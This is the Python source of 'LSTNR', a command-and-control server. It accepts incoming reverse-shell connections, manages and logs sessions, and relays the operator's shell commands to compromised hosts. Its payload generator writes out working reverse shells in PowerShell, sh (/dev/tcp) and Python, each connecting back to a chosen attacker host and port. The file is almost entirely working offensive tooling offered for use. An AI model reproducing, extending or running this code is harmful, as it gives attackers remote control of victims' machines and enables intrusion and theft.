import sys
import threading
import socket
import time
import readline
import os
import re
from collections import defaultdict

# colors
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
ORANGE = "\033[93m"
BLUE = "\033[94m"

clients = {}
selected_client = None
client_id_counter = 1
client_threads = {}
prompt_mode = "main"

MAIN_COMMANDS = ["list ", "select ", "payload ", "exit ", "help ", "kill "]
SESSION_COMMANDS = ["background", "die"]
PAYLOAD_COMMANDS = ["set ", "generate ", "back ", "options ", "help "]

payload_settings = {
    "name": None,
    "lhost": "127.0.0.1",
    "lport": "80",
    "payload": "sh"
}

# session log directory
LOG_DIR = "session_logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def log_to_file(client_id, ip, content, direction="send"):
    filename = f"{client_id}_{ip}.log"
    path = os.path.join(LOG_DIR, filename)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    prefix = "[SEND]" if direction == "send" else "[RECV]"
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} {prefix} {content}\n")

def format_table(data, headers):
    # Unicode box-drawing characters
    top_left = '╔'
    top_mid = '╦'
    top_right = '╗'
    mid_left = '╠'
    mid_mid = '╬'
    mid_right = '╣'
    bottom_left = '╚'
    bottom_mid = '╩'
    bottom_right = '╝'
    horizontal = '═'
    vertical = '║'

    # Calculate column widths
    col_widths = [max(len(header), max(len(row[i]) for row in data)) for i, header in enumerate(headers)]

    def make_row(values):
        return vertical + " " + f" {vertical} ".join(f"{str(v).ljust(col_widths[i])}" for i, v in enumerate(values)) + " " + vertical

    def make_border(left, mid, right):
        return left + mid.join(horizontal * (w + 2) for w in col_widths) + right

    top = make_border(top_left, top_mid, top_right)
    divider = make_border(mid_left, mid_mid, mid_right)
    bottom = make_border(bottom_left, bottom_mid, bottom_right)
    header_row = make_row(headers)
    body = "\n".join(make_row(row) for row in data)

    return "\n".join([top, header_row, divider, body, bottom])

def clean_output(data, user="Unknown"):
    
    lines = data.splitlines()
    cleaned_lines = []
    for line in lines:
        if re.match(r"(?i)^ps [a-z]:\\.*>$", line.strip()):
            continue
        # remove bash/sh/python prompts: "$ " or "# "
        if line.strip() in ("$", "#"):
            continue
        cleaned_lines.append(line)
    return "\n".join(cleaned_lines)


def client_handler(conn, addr, client_id):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            if selected_client == client_id:
                decoded_data = data.decode(errors="ignore")
                user = clients[client_id]["user"]
                cleaned_data = clean_output(decoded_data, user)
                if cleaned_data.strip():
                    sys.stdout.write(cleaned_data + "\n")
                    sys.stdout.flush()
                    log_to_file(client_id, clients[client_id]["ip"], cleaned_data, direction="recv")
    except Exception:
        pass
    finally:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except:
            pass
        conn.close()
        clients.pop(client_id, None)
        client_threads.pop(client_id, None)


def start_LSTNR(host, port):
    global client_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"Listening on {host}:{port}...")
    
    def accept_connections():
        nonlocal server
        global client_id_counter
        while True:
            conn, addr = server.accept()
            client_id = client_id_counter
            clients[client_id] = {"conn": conn, "ip": addr[0], "hostname": "Unknown", "user": "Unknown"}
            client_thread = threading.Thread(target=client_handler, args=(conn, addr, client_id), daemon=True)
            client_threads[client_id] = client_thread
            client_thread.start()
            client_id_counter += 1

    threading.Thread(target=accept_connections, daemon=True).start()


def complete(text, state):
    options = []
    if prompt_mode == "main":
        options = [cmd for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    elif prompt_mode == "session":
        options = [cmd for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    elif prompt_mode == "payload":
        options = [cmd for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

readline.set_completer_delims(' \t\n')
readline.parse_and_bind("tab: complete")
readline.set_completer(complete)

def cli():
    global selected_client, prompt_mode
    print(f"""
{RED}
██╗     ███████╗████████╗███╗   ██╗██████╗ 
██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
███████╗███████║   ██║   ██║ ╚████║██║  ██║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control v1.0{RESET}
""")
    while True:
        try:
            if not selected_client:
                prompt_mode = "main"
                cmd = input(f"{BLUE}LSTNR>{RESET} ").strip()
                if not cmd:
                    continue
                if cmd == "exit":
                    break
                elif cmd == "help":
                    show_help()
                elif cmd == "list":
                    list_clients()
                elif cmd.startswith("select "):
                    select_client(cmd)
                elif cmd == "payload":
                    payload_menu()
                elif cmd.startswith("kill "):
                    kill_client(cmd)
            else:
                prompt_mode = "session"
                conn = clients[selected_client]["conn"]
                cmd = input("").strip()
                if not cmd:
                    continue
                if cmd == "background":
                    print(f"{ORANGE}[*] Session background.{RESET}")
                    selected_client = None
                    time.sleep(0.1)
                elif cmd == "die":
                    try:
                        conn.sendall(b"__exit__")
                    except:
                        pass
                    try:
                        conn.shutdown(socket.SHUT_RDWR)
                    except:
                        pass
                    conn.close()
                    del clients[selected_client]
                    client_threads.pop(selected_client, None)
                    print(f"{ORANGE}[*] Client Terminated{RESET}")
                    selected_client = None
                    time.sleep(0.1)
                else:
                    conn.sendall(cmd.encode() + b"\n")
                    log_to_file(selected_client, clients[selected_client]["ip"], cmd, direction="send")
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to shut down the LSTNR cleanly.")
        except Exception:
            continue

def show_help():
    print(f"""
{ORANGE}Menu commands:{RESET}
    list                - List sessions
    select <id>         - Connect to a session by its ID
    payload             - Payload generation menu
    kill <id>           - Terminate specific session
    exit                - Terminate all sessions and exit LSTNR
{ORANGE}Session commands:{RESET}
    <any command>       - Execute command on client
    background          - Return to main menu
    die                 - Terminate current session
{ORANGE}Payload Menu Commands:{RESET}
    set name <name>     - Custom name for reverse shell
    set lhost <ip>      - Set the LSTNR IP address
    set lport <port>    - Set the LSTNR listening port
    set payload <type>  - Set payload type (EX: py, sh, ps1)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
""")


def update_client_info_from_logs():
    for cid, client in clients.items():
        filename = f"{cid}_{client['ip']}.log"
        path = os.path.join(LOG_DIR, filename)
        if not os.path.exists(path):
            continue

        last_user = "Unknown"
        last_host = "Unknown"
        pending_cmd = None

        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "[SEND]" in line:
                    if "whoami" in line.lower():
                        pending_cmd = "whoami"
                    elif "hostname" in line.lower():
                        pending_cmd = "hostname"
                    else:
                        pending_cmd = None
                elif "[RECV]" in line and pending_cmd:
                    match = re.search(r"\[RECV\]\s+(.*)", line)
                    if match:
                        result = match.group(1).strip()
                        if pending_cmd == "whoami":
                            last_user = result
                        elif pending_cmd == "hostname":
                            last_host = result
                        pending_cmd = None
        clients[cid]["user"] = last_user
        clients[cid]["hostname"] = last_host


def list_clients():
    if not clients:
        print("[!] No clients connected.")
        return

    update_client_info_from_logs()

    headers = ["ID", "IP", "USER", "HOSTNAME"]
    data = []

    for cid, c in clients.items():
        user = c["user"]
        data.append([str(cid), c["ip"], user, c["hostname"]])
    print(format_table(data, headers))


def select_client(cmd):
    global selected_client
    try:
        client_id = int(cmd.split()[1])
        if client_id in clients:
            selected_client = client_id
            print(f"{ORANGE}[*] Client {client_id} selected.{RESET}")
        else:
            print("Invalid client ID.")
    except (IndexError, ValueError):
        print("Usage: select <client_id>")

def kill_client(cmd):
    try:
        client_id = int(cmd.split()[1])
        if client_id in clients:
            try:
                clients[client_id]["conn"].sendall(b"__exit__")
            except:
                pass
            try:
                clients[client_id]["conn"].shutdown(socket.SHUT_RDWR)
            except:
                pass
            clients[client_id]["conn"].close()
            del clients[client_id]
            client_threads.pop(client_id, None)
            print(f"{ORANGE}[*] Client {client_id} terminated.{RESET}")
        else:
            print("Invalid client ID.")
    except (IndexError, ValueError):
        print("Usage: kill <client_id>")

def payload_menu():
    global payload_settings, prompt_mode
    prompt_mode = "payload"
    while True:
        try:
            cmd = input(f"{RED}payload>{RESET} ").strip()
            if not cmd:
                continue
            if cmd == "back":
                print()
                break
            elif cmd == "help":
                payload_help()
            elif cmd.startswith("set"):
                handle_payload_set(cmd)
            elif cmd == "options":
                show_payload_options()
            elif cmd == "generate":
                generate_payload()
        except KeyboardInterrupt:
            break

def handle_payload_set(cmd):
    parts = cmd.split()
    if len(parts) == 3:
        key, value = parts[1], parts[2]
        if key in payload_settings:
            payload_settings[key] = value
            print(f"Set {key} to {value}")
        else:
            print(f"Invalid setting: {key}")
    else:
        print("Usage: set <key> <value>")


def show_payload_options():
    print("Current Payload Settings:")
    for key, value in payload_settings.items():
        print(f"  {key}: {value if value is not None else 'default'}")


def generate_payload():
    name = payload_settings.get("name")
    lhost = payload_settings["lhost"]
    lport = payload_settings["lport"]
    payload_type = payload_settings["payload"]

    if payload_type == "ps1":
        payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
"""
    elif payload_type == "sh":
        payload = f"""
/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
"""
    elif payload_type == "py":
        payload = f"""
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""
    else:
        print(f"Unknown payload type: {payload_type}")
        return

    if name:
        filename = f"{name}.{payload_type if payload_type != 'py' else 'py'}"
    else:
        filename = f"{lhost}_{lport}.{payload_type if payload_type != 'py' else 'py'}"

    with open(filename, "w") as f:
        f.write(payload)
    print(f"Payload generated and saved to {filename}\n")

def payload_help():
    print(f"""
{ORANGE}Payload Menu Commands:{RESET}
    set lhost <ip>      - Set the LSTNR IP address
    set lport <port>    - Set the LSTNR listening port
    set payload <type>  - Set payload type (EX: py, sh, ps1)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
""")

if __name__ == "__main__":
    port = 80
    if len(sys.argv) >= 3 and sys.argv[1] in ("-p", "--port"):
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        port = int(sys.argv[1])
    start_LSTNR("0.0.0.0", port)
    cli()
